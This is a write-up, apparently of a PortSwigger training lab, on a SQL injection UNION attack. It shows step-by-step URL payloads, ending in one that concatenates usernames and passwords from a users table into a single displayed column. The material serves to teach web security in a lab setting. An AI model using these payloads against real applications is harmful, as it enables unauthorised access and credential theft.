# SQL injection UNION attack, retrieving multiple values in a single column

This lab focuses on extracting multiple pieces of information when the
application displays only one useful value from the UNION result.

The database contains a `users` table with `username` and `password`
columns. The objective remains to retrieve the administrator credentials
and use them to log in.

Hint: Useful payloads can be found in the SQL injection cheat sheet.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/union-attacks
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

Only one value is displayed in the product table: the product name.

**Pic 1**

The category parameter accepts the following payloads. The first targets
the Gifts category, while the second makes the condition true for all
categories:

``` text
/filter?category=Gifts'--
/filter?category=Gifts'+or+1=1--
```

The underlying query returns two columns, so a UNION query with two
values can be used:

``` text
/filter?category=Gifts'+union+all+select+NULL,NULL--
```

**Pic 2**

Since only one displayed column is useful, multiple strings can be
combined into that column with `CONCAT`:

``` text
/filter?category=Gifts'+union+all+select+NULL,CONCAT('foo','bar')--
```

This confirms that values from the second column can be combined and
displayed together.

**Pic 3**

The same approach can be applied to database values. The username and
password are joined with a colon so both values can be returned through
a single displayed column:

``` text
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```

**Pic 4**
